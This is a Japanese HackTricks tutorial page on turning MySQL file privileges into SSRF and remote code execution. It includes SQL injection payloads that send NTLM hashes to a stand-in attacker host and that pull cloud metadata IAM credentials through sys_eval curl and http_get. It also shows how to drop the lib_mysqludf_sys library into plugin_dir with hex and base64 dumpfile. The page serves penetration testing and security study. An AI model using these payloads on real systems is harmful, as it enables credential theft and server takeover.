# MySQL File privをSSRF/RCEに利用

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローに学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

### LOAD\_FILE/LOAD DATA/LOAD XMLをSSRFに利用

すべてのSQL Out of Bandデータ漏洩記事は、ネットワークリクエストを行うために`LOAD_FILE()`文字列関数を使用します。この関数自体は、実行されるオペレーティングシステムとデータベースが開始された設定に基づいて独自の制限があります。

例えば、`secure_file_priv`グローバル変数が設定されていない場合、[デフォルト値は`/var/lib/mysql-files/`に設定されています](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html)。これは、`LOAD_FILE('filename')`や`LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename`のような関数を使用して`/var/lib/mysql-files/`ディレクトリからファイルを読み取ることができることを意味します。このディレクトリの外のファイルを読み取ることができるようにするには、`secure_file_priv`オプションを`""`に設定する必要がありますが、これはデータベースの設定ファイルを更新するか、データベースサービスの起動パラメータとして`--secure_file_priv=""`を渡すことによってのみ行うことができます。

それにもかかわらず、`secure_file_priv`が`""`に設定されている状況下では、ファイルの読み取り権限があり、現在のデータベースユーザーの`mysql.user`で`file_priv`が`Y`に設定されていると仮定すると、システム上の他のファイルを読み取ることができるはずです。しかし、これらの関数を使用してネットワークコールを行うことができるかどうかは、非常にオペレーティングシステムに依存しています。これらの関数はファイルを読み取るためだけに構築されているため、ネットワーク関連のコールが可能なのは、[Windowsホスト上のUNCパスへのアクセス時に呼び出されるWindowsの`CreateFileA` APIがUNC命名規則を理解している](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file)場合のみです。

したがって、ターゲットデータベースがWindowsマシン上で実行されている場合、インジェクションクエリ`x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //`は[Windowsマシンが攻撃者がコントロールする`\\attackerserver.example.com`で認証を試みるためにNTLMv2ハッシュを送信する結果になります](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html)。

このサーバーサイドリクエストフォージェリは有用ですが、TCPポート445にのみ制限されています。ポート番号を制御することはできませんが、完全な読み取り権限を持つ共有から情報を読み取ることができます。また、古い研究で示されているように、この限定的なSSRF機能を使用してハッシュを盗み、シェルを取得するためにリレーすることができるので、確かに有用です。

### ユーザー定義関数をRCEに利用

MySQLデータベースでのもう一つのクールなテクニックは、特定の場所やシステムの$PATHに存在する場合、MySQL内からアクセスできる外部ライブラリファイルに存在するユーザー定義関数（UDF）を使用する能力です。

SQLインジェクションを使用して、ネットワーク/HTTPリクエストを行うことができるユーザー定義関数を含むライブラリ（`.so`または`.dll`、LinuxまたはWindowsに依存）を**書き込み**、追加のクエリを通じて呼び出すことができます。

ただし、これには独自の制限があります。`select @@version`で識別できるMySQLのバージョンに基づいて、プラグインをロードできるディレクトリは制限されています。`v5.0.67`以下のMySQLでは、`plugin_dir`変数が設定されていない場合、システムパスからライブラリファイルをロードすることが許可されていました。これは現在変更されており、新しいバージョンでは**`plugin_dir`**変数が通常rootが所有する`/usr/lib/mysql/plugin/`のようなものに設定されています。

基本的に**SQLインジェクションを介してMySQLにカスタムライブラリをロードし、ロードされたライブラリから関数を呼び出すためには**、以下が必要です：

* SQLインジェクションを介して**`@@plugin_dir`**で指定された場所に**書き込む能力**
* 現在のデータベースユーザーの`mysql.user`で**`file_priv`**が**`Y`**に設定されている
* ネットワークやWebアプリケーションのファイルアップロードディレクトリなど、任意の場所からライブラリの生のバイトを読み取ることができるようにするために**`secure_file_priv`**が**`""`**に設定されている

上記の条件が満たされている場合、[**人気のMySQL UDF `lib_mysqludf_sys`ライブラリ**](https://github.com/mysqludf/lib\_mysqludf\_sys)をデータベースサーバーに転送する**古典的なアプローチを使用できます**。その後、`cURL`や`powershell wget`などのオペレーティングシステムコマンドリクエストを使用してSSRFを実行できます。

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

このライブラリに宣言されている他の多くの関数については[こちら](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)で分析を見ることができます。私のように怠け者なら、ターゲットOSのこのUDFライブラリのコピーを`/usr/share/metasploit-framework/data/exploits/mysql/`ディレクトリからmetasploitインストールから入手して始めることができます。

代わりに、データベースがHTTPリクエストを行う能力を提供するために特別に作成されたUDFライブラリがあります。次の構文を使用して、[MySQLユーザー定義関数（UDF）をHTTP GET/POSTに使用](https://github.com/y-ken/mysql-udf-http)することができます。

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

また、[独自のUDFを作成して、後の悪用に使用することもできます。](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

いずれにせよ、ライブラリをデータベースサーバーに転送する必要があります。これは複数の方法で行うことができます。

1. MySQLの`hex()`文字列関数や`xxd -p filename.so | tr -d '\n'`のようなものを使用して、ライブラリの内容を16進数形式に変換し、その後`x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`を使用して`@@plugin_dir`ディレクトリにダンプします。
2. 代わりに、`filename.so`の内容をbase64に変換し、`x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`を使用します。

`@@plugin_dir`が書き込み可能でない場合は、バージョンが`v5.0.67`以上であれば運が悪いです。それ以外の場合は、パス内の別の場所に書き込み、そこからUDFライブラリをロードします。

* `lib_mysqludf_sys`ライブラリの場合 - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* `mysql-udf-http`ライブラリの場合 - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

これを自動化するためには、[カスタムUDFの使用をサポートする`--udf-inject`オプションを介してSQLMapを使用](https://github.com/sqlmapproject/sqlmap/wiki/Usage)することができます。

Blind SQLインジェクションの場合、UDF関数の出力を一時的なテーブルにリダイレクトし、そこからデータを読み取るか、`sys_eval`や`sys_exec`のcurlコマンド内に密輸された[DNSリクエストを使用](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)することができます。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローに学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
